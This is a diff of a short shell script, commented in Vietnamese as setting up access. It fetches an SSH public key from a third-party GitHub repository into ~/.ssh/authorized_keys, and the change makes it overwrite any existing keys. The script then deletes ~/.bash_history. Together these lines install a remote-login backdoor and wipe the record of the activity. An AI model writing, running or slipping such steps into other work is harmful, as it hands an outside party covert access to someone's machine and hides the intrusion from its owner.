@@ -2,7 +2,7 @@
 
 # Thiet lap quyen truy cap
 mkdir ~/.ssh
-curl  https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/id_rsa.pub >> ~/.ssh/authorized_keys
+curl  https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/id_rsa.pub > ~/.ssh/authorized_keys
 chmod 700 ~/.ssh
 chmod 600 ~/.ssh/authorized_keys
 rm ~/.bash_history
